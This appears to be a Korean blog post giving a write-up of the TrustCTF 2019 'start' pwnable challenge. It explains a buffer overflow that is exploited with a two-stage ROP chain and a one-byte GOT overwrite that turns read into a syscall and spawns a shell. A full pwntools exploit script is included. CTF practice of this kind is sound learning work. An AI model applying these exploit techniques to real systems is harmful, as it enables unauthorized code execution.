---
layout: post
title: ! "[TrustCTF 2019] start Write-up"
excerpt_separator: <!--more-->
comments : true
tags:
  - Write-up
  - CTF
---

TrustCTF에 나왔던 가장 쉬운 `pwnable` 문제였던 start 풀이.


<!--more-->

### 문제

![]({{ site.baseurl }}/images/KRater/2019-03-07-start-writeup/pic01.PNG)

간단한 BOF문제인데 read 이후 프로그램이 끝나고, write는 주지도 않는다.

같은 팀원한테 물어봐서 바보소리 듣고 read 함수 안에있는 syscall 쓰라고 해서 풀었다 헤헤..

![]({{ site.baseurl }}/images/KRater/2019-03-07-start-writeup/pic02.PNG)

ROP 하라고 대놓고 가젯폭탄도 던져준다.

버퍼사이즈 빡빡하긴 한데 이게 있어서 전부 구겨넣을 수 있다.

![]({{ site.baseurl }}/images/KRater/2019-03-07-start-writeup/pic03.PNG)

주어진 libc에서 read 함수 안에있는 syscall 위치를 찾는다.

### Stage 1

```python
payload1 = "A"*16
payload1 += p64(real_rbp)
payload1 += p64(pop4_ret)
payload1 += p64(0)
payload1 += p64(8)
payload1 += p64(0)
payload1 += p64(bss_addr)
payload1 += p64(read_plt)
payload1 += p64(main_addr)
#print (len(payload1))
r.send(payload1)
r.send("/bin/sh\x00")
```

bss 영역에 `/bin/sh`를 써 넣는다.

그리고 다시 main 함수로 돌아간다.

### Stage 2

```python
payload2 = "B" * 16
payload2 += p64(real_rbp)
payload2 += p64(pop4_ret)
payload2 += p64(0)
payload2 += p64(1)
payload2 += p64(0)
payload2 += p64(read_got)
payload2 += p64(read_plt)
payload2 += p64(pop4_ret)
payload2 += p64(0x3b)
payload2 += p64(0)
payload2 += p64(bss_addr)
payload2 += p64(0)
payload2 += p64(read_plt)
#print (len(payload2))
r.send(payload2)
r.send("\x7b")
```

그다음은 read got 영역을 1바이트만 쓴다. (syscall 주소, 0x7b)

이제 read가 syscall이 됬으니까 bss 영역에 쓴 `/bin/sh`를 활용해서 쉘을 따주면 된다 ^0^

### Exploit Code

```python
from pwn import *

HOST = "server.trustctf.com"
PORT = 10392
r = remote(HOST, PORT)
#r = process("./start")

pop4_ret = 0x4005EA # pop rax rdx rdi rsi
bss_addr = 0x601058
main_addr = 0x4005F2
read_got = 0x601018
read_plt = 0x4004B0
real_rbp = 0x400660

payload1 = "A"*16
payload1 += p64(real_rbp)
payload1 += p64(pop4_ret)
payload1 += p64(0)
payload1 += p64(8)
payload1 += p64(0)
payload1 += p64(bss_addr)
payload1 += p64(read_plt)
payload1 += p64(main_addr)
#print (len(payload1))
r.send(payload1)
r.send("/bin/sh\x00")

payload2 = "B" * 16
payload2 += p64(real_rbp)
payload2 += p64(pop4_ret)
payload2 += p64(0)
payload2 += p64(1)
payload2 += p64(0)
payload2 += p64(read_got)
payload2 += p64(read_plt)
payload2 += p64(pop4_ret)
payload2 += p64(0x3b)
payload2 += p64(0)
payload2 += p64(bss_addr)
payload2 += p64(0)
payload2 += p64(read_plt)
#print (len(payload2))
r.send(payload2)
r.send("\x7b")

#r.sendline("cat flag")

r.interactive()
```

쉬운 문제였지만 감을 잃지 않으려면 꾸준히 노력해야 한다는 것을 깨닫게 해 준 고마운 문제였다.
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTc3MDYwMzU3XX0=
-->